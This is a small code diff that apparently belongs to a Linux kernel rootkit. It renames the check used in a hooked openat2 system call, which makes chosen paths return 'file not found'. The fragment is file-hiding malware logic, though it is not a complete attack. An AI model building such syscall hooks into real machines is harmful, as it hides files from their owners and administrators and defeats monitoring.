@@ -20,7 +20,7 @@ asmlinkage int64_t h_do_sys_openat2(int dfd, const char __user *filename, struct
   if (user_path_at(dfd, filename, LOOKUP_FOLLOW, &path) != 0)
     goto end;
 
-  if (is_path_hidden(&path))
+  if (should_hide_path(&path))
     ret = -ENOENT;
 
 end:
